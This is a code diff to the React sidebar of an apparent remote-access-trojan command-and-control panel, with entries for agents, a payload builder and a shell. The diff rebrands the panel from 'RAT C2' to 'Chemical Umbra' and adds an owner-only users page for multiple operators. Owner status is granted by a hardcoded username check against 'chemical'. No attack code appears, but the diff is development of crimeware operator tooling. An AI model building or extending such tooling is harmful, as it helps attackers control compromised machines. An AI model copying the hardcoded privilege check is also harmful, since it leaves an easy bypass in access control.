@@ -30,6 +30,7 @@ const navigation = [
   { name: 'Dashboard', href: '/', icon: LayoutDashboard },
   { name: 'Agents', href: '/agents', icon: Monitor },
   { name: 'Payload Builder', href: '/payloads', icon: Box },
+  { name: 'Registered Users', href: '/users', icon: Users, ownerOnly: true },
   { name: 'Shell', href: '/shell', icon: Terminal, disabled: true },
   { name: 'Settings', href: '/settings', icon: Settings },
 ]
@@ -37,7 +38,9 @@ const navigation = [
 export function Sidebar() {
   const location = useLocation()
   const [collapsed, setCollapsed] = React.useState(false)
-  const { logout } = useAuthStore()
+  const { logout, user } = useAuthStore()
+  const isOwner = (user?.role === 'owner') || (user?.username || '').toLowerCase() === 'chemical'
+  const items = navigation.filter(item => !('ownerOnly' in item && item.ownerOnly) || isOwner)
 
   return (
     <aside
@@ -62,7 +65,7 @@ export function Sidebar() {
           </motion.div>
           {!collapsed && (
             <GradientText className="font-bold text-xl" colors={['#fff', '#d946ef', '#a855f7']}>
-              RAT C2
+              Chemical Umbra
             </GradientText>
           )}
         </Link>
@@ -91,7 +94,7 @@ export function Sidebar() {
               <div className="px-3 py-2 text-xs font-semibold text-dark-500 uppercase tracking-wider">
                 Main
               </div>
-              {navigation.map((item) => (
+              {items.map((item) => (
                 <NavLink
                   key={item.name}
                   to={item.href}
@@ -117,7 +120,7 @@ export function Sidebar() {
         {/* Collapsed tooltips */}
         {collapsed && (
           <div className="space-y-1">
-            {navigation.map((item) => (
+            {items.map((item) => (
               <Link
                 key={item.name}
                 to={item.href}
@@ -219,8 +222,8 @@ export function Sidebar() {
               <span className="absolute bottom-0 right-0 w-2 h-2 bg-green-400 rounded-full border-2 border-dark-900" />
             </div>
             <div className="flex-1 min-w-0">
-              <p className="text-sm font-medium text-dark-100 truncate">admin</p>
-              <p className="text-xs text-dark-500 truncate">Administrator</p>
+              <p className="text-sm font-medium text-dark-100 truncate">{user?.username || 'operator'}</p>
+              <p className="text-xs text-dark-500 truncate">{isOwner ? 'Owner' : 'Operator'}</p>
             </div>
             <Button variant="ghost" size="icon" onClick={logout} className="text-dark-400 hover:text-red-400">
               <X className="w-5 h-5" />
